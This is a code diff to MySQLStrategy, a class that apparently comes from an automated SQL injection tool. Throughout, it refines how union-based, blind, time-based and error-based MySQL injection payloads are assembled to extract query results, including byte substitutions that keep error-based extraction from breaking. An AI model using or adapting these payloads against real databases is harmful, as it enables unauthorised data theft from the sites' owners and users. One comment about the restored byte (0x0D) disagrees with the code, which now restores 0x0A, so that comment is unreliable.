@@ -182,7 +182,6 @@ public class MySQLStrategy extends ASQLStrategy {
         return
             MediatorModel.model().initialQuery
                 .replaceAll(
-//                    "1337" + MediatorModel.model().visibleIndex + "7331",
                     "1337" + MediatorModel.model().normalStrategy.visibleIndex + "7331",
                     "(select+0x" + ToolsString.strhex(content) + ")"
                 )
@@ -245,7 +244,6 @@ public class MySQLStrategy extends ASQLStrategy {
                     "mid(" +
                         "(" + sqlQuery + ")," +
                         startPosition + "," +
-//                        MediatorModel.model().performanceLength +
                         MediatorModel.model().blindStrategy.getPerformanceLength() +
                     ")" +
                 ")" +
@@ -262,7 +260,6 @@ public class MySQLStrategy extends ASQLStrategy {
                         "mid(" +
                             "(" + sqlQuery + ")," +
                             startPosition + "," +
-//                            "65536" +
                             MediatorModel.model().timeStrategy.getPerformanceLength() +
                         ")" +
                     ")" +
@@ -300,12 +297,17 @@ public class MySQLStrategy extends ASQLStrategy {
                             "replace(" +
                                 "mid(" +
                                     "replace(" +
+                                    "replace(" +
                                         "(" + sqlQuery + ")" +
                                     /**
                                      * message error base remplace le \r en \r\n => pb de comptage
-                                     * Fix: remplacement forcé 0x0D => 0x0000
+                                     * Fix: remplacement forcé 0x0A => 0x0102
                                      */
-                                    ",0x0D,0x0000)," +
+                                    ",0x0A,0x0102)" +
+                                    /**
+                                     * avoid empty character that breaks injection
+                                     */
+                                    ",0x00,'')," +
                                     startPosition + "," +
                                     /**
                                      * errorbase renvoit 64 caractères: 'SQLi' en consomme 4
@@ -314,9 +316,9 @@ public class MySQLStrategy extends ASQLStrategy {
                                     "60" +
                                 ")" +
                             /**
-                             * rétablissement 0x0000 => 0x0D
+                             * rétablissement 0x0102 => 0x0D
                              */
-                            ",0x0000,0x0D)," +
+                            ",0x0102,0x0A)," +
                             "floor(rand(0)*2)" +
                         ")" +
                     "from+information_schema.tables+" +
@@ -342,7 +344,6 @@ public class MySQLStrategy extends ASQLStrategy {
                              * Minus 'SQLi' should apply
                              */
                             MediatorModel.model().normalStrategy.getPerformanceLength() +
-//                            MediatorModel.model().performanceLength +
                         ")" +
                     ")" +
             ")";
